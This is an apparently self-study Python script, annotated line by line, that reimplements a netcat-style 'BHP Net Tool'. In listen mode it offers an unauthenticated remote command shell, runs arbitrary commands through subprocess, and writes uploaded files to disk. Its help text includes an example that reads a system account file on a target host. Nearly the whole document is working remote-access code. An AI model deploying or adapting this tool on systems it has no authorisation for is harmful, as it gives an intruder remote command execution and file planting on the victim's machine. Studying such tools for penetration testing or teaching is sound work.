# Import necerssary libraries

import argparse
import socket
import shlex
import subprocess
import sys
import textwrap
import threading

# Create a function (execute) which receives a command, runs it and then returns the output as a string. Uses subprocess' check_output method which runs a command on the local system OS and then returns the output.

def execute(cmd):
    cmd = cmd.strip()
    if not cmd:
        return
    output = subprocess.check_output(shlex.split(cmd), stderr=subprocess.STDOUT)
    return output.decode()


#   We initialise the NetCat object with arguements from the command line & buffer. 
#   We then create the socket object

class NetCat:
    def __init__(self, args, buffer=None):
        self.args = args
        self.buffer = buffer
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

#   We create a run method, which is the entry point for managing the NetCat object. If we are setting up a listener, it calls the listener method. Otherwise, it calls the send method. Created further on.    

    def run (self):
        if self.args.listen:
            self.listen()
        else:
            self.send()

#   ((76)) - We connect to the target IP and Port, and if we have a buffer we send that first. 
#   We then set up a try/catch block si we can manually close the connection with CTRL+C.
#   ((83)) - Next, we set up a loop to receive data from the target. If there is no more data, we break out of the loop. 
#   ((97)) - Otherwise, we print the response data and pause to get interactive input, send that input and continue the loop.
#   This continues until a CTRL+C Keyboard Interrup occurs - Which closes the socket.  

    def send(self):
        self.socket.connect((self.args.target, self.args.port))
        if self.buffer:
            self.socket.send(self.buffer)
    
        try:
            while True:
                recv_len = 1
                response = ''
                while recv_len:
                    data = self.socket.recv(4096)
                    recv_len = len(data)
                    response += data.decode()
                    if recv_len < 4096:
                        break
                if response:
                    print(response)
                    buffer = input('> ')
                    buffer += '\n'
                    self.socket.send(buffer.encode())
        except KeyboardInterrupt:
            print('User Terminated - Bitch')
            self.socket.close()
            sys.exit()

#   The listen method binds to the target IP & Port & starts listening in a loop - passing the connected socket to the Handle method.    

    def listen(self):
        self.socket.bind((self.args.target, self.args.port))
        self.socket.listen(5)
        while True:
            client_socket, _ = self.socket.accept()
            client_thread = threading.Thread(
                target=self.handle, args=(client_socket,)
            )
            client_thread.start()

#   ((121)) The handle method executes the task corrosponding to the command line arguement it receives, execute a command, upload a file or start a shell. 
#   (122))  If a command should be executed, the handle method passes that command to the execute function and sends the output back on the socket.
#   ((126)) If a file should be uploaded, we setup a loop to listen for content on the listening socket and receive data until there is no more data coming in. Then we write that accumulated content to the specified file. 
#   ((140)) Finally, if a shell is to be created - We setup a loop, send a prompt to the sender, and wait for the command string to come back. We then execute the command by using the execute function and return the output of the command to the sender. 
    
    def handle(self, client_socket):
        if self.args.execute:
            output = execute(self.args.execute)
            client_socket.send(output.encode())
        
        elif self.args.upload:
            file_buffer = b''
            while True:
                data = client_socket.recv(4096)
                if data:
                    file_buffer += data
                else:
                    break
            
            with open(self.args.upload, 'wb') as f:
                f.write(file_buffer)
            message = f'Saved File {self.args.upload}'
            client_socket.send(message.encode())
        
        elif self.args.command:
            cmd_buffer = b''
            while True:
                try:
                    client_socket.send(b'BHP: #> ')
                    while '\n' not in cmd_buffer.decode():
                        cmd_buffer += client_socket.recv(64)
                    response = execute(cmd_buffer.decode())
                    if response:
                        client_socket.send(response.encode())
                    cmd_buffer = b''
                except Exception as e:
                    print(f'Server Killed {e}')
                    self.socket.close()
                    sys.exit()
                    
#   Using the argparse module from the standard library, we create a command line interface. We can provide arguements within the command line, as defined below, when executing our Netcat.py script to run specific functions as described below. 
#   We provide an example of how to use the script which can be invoked by the --help command. 


if __name__ == '__main__':
    parser = argparse.ArgumentParser(
        description='BHP Net Tool', formatter_class=argparse.RawDescriptionHelpFormatter, 
        epilog=textwrap.dedent('''Example: 
                               netcat.py -t 192.168.1.108 -p 5555 -l -c                         # Command Shell
                               netcat.py -t 192.168.1.108 -p 5555 -l -u=mytext.txt              # Upload a File
                               netcat.py -t 192.168.1.108 -p 5555 -l -e\"cat /etc/password\"      # Execute Command
                               echo 'ABC' | ./netcat.py -t 192.168.1.108 -p 135                 # Echo Text To Server Port 135
                               netcat.py -t 192.168.1.108 -p 5555                               # Connect To Server
        '''))

#   We add 6 arguements within the script and then specify how we want them to behave

parser.add_argument('-c', '--command', action='store_true', help='Command Shell')
parser.add_argument('-e', '--execute', help='Execute Specified Command')
parser.add_argument('-l', '--listen', action='store_true', help='Listen')
parser.add_argument('-p', '--port', type=int, default=5555, help='Specified Port')
parser.add_argument('-t', '--target', default='192.168.1.203', help='Specified IP')
parser.add_argument('-u', '--upload', help='Upload File')
args = parser.parse_args()

#   If we are setting up a listener, we invoke the NetCat object with an empty buffer string. Otherwise, we send the buffer content from stdin. We then finally call the run method to start it up. 

if args.listen:
    buffer = ''
else:
    buffer = sys.stdin.read()

nc = NetCat(args, buffer.encode())
nc.run()